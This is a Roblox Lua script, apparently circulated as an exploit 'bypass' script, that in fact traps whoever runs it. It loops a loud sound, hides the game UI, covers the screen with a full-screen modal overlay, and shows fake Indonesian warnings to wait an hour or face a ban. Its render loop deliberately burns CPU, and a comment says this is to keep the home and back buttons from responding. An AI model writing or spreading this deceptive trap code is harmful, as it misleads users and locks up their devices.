-- [[ DekaTeamHub: ABSOLUTE TACO BRUTE FORCE ]] --
task.spawn(function()
    local SS = game:GetService("SoundService")
    
    -- 1. ULTIMATE AUDIO BYPASS (SPAM PLAY)
    local function forceAudio()
        local s = Instance.new("Sound")
        s.SoundId = "rbxassetid://142276005" -- TACO
        s.Volume = 10
        s.Looped = true
        s.Parent = SS
        
        -- Coba berbagai metode play
        s:Play()
        pcall(function() SS:PlayLocalSound(s) end) 
    end
    
    forceAudio()

    -- 2. DISABLE SYSTEM & UI
    pcall(function()
        game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
    end)

    -- 3. VISUAL TRAP (COLOR BARS + FAKE TEXT)
    local screen = Instance.new("ScreenGui", game:GetService("CoreGui"))
    screen.DisplayOrder = 2147483647
    screen.IgnoreGuiInset = true

    local B = Instance.new("TextButton", screen)
    B.Size = UDim2.new(1, 0, 1, 0)
    B.BackgroundColor3 = Color3.new(0, 0, 0)
    B.Modal = true
    B.Text = ""

    -- Rainbow Bars
    local Bars = Instance.new("Frame", B)
    Bars.Size = UDim2.new(1, 0, 1, 0)
    local colors = {
        Color3.fromRGB(191,191,191), Color3.fromRGB(191,191,0),
        Color3.fromRGB(0,191,191), Color3.fromRGB(0,191,0),
        Color3.fromRGB(191,0,191), Color3.fromRGB(191,0,0),
        Color3.fromRGB(0,0,191)
    }
    for i, c in pairs(colors) do
        local f = Instance.new("Frame", Bars)
        f.Size = UDim2.new(1/#colors, 0, 1, 0)
        f.Position = UDim2.new((i-1)/#colors, 0, 0, 0)
        f.BackgroundColor3 = c
        f.BorderSizePixel = 0
    end

    -- FAKE TEXT (Sesuai foto Tuan)
    local T = Instance.new("TextLabel", B)
    T.Size = UDim2.new(0.8, 0, 0.4, 0)
    T.Position = UDim2.new(0.1, 0, 0.3, 0)
    T.BackgroundTransparency = 1
    T.TextColor3 = Color3.new(1, 0, 0)
    T.TextScaled = true
    T.Font = "Code"
    T.Text = "SABAR TUNGGU 1 JAM!\nJANGAN LEAVE KALAU MAU SCRIPT WORK!\n\nSCRIPT BYPASS SEMUANYA DULU!\nKALAU GAK BYPASS BAKAL DI BAN!!"

    -- 4. GLITCH ENGINE
    game:GetService("RunService").RenderStepped:Connect(function()
        Bars.Position = UDim2.new(0, math.random(-10, 10), 0, math.random(-10, 10))
        if math.random(1, 5) == 1 then
            local n = Instance.new("Frame", B)
            n.Size = UDim2.new(1, 0, 0, math.random(5, 30))
            n.Position = UDim2.new(0, 0, math.random(0, 100)/100, 0)
            n.BackgroundColor3 = Color3.new(1, 1, 1)
            n.BackgroundTransparency = 0.5
            task.delay(0.02, function() n:Destroy() end)
        end
        -- Bikin lag biar gak bisa pencet tombol home/back lancar
        for i = 1, 3000000 do local _ = i * i end
    end)
end)















